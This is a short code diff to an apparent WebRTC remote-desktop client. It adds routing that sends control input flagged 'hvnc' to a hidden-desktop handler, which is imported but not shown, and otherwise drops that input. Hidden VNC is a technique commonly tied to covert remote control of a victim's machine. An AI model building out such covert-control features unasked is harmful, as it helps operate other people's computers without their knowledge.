@@ -681,6 +681,21 @@ class WebRTCClient:
                 if session_actions and session_actions.set_cursor_visibility:
                     session_actions.set_cursor_visibility(visible)
                 return
+            
+            # Check if this is an HVNC control command
+            is_hvnc = payload.get("hvnc", False)
+            if is_hvnc:
+                try:
+                    from remote_client.windows.hvnc_actions import handle_hvnc_control
+                    if handle_hvnc_control(payload):
+                        return  # Successfully handled by HVNC
+                    # HVNC not active, fall through to main desktop
+                    logger.debug("HVNC control failed, input not routed")
+                except ImportError:
+                    logger.debug("HVNC module not available")
+                # Don't send to main desktop if hvnc flag is set
+                return
+            
             try:
                 control_handler.handle(payload)
             except (KeyError, ValueError, TypeError) as exc:
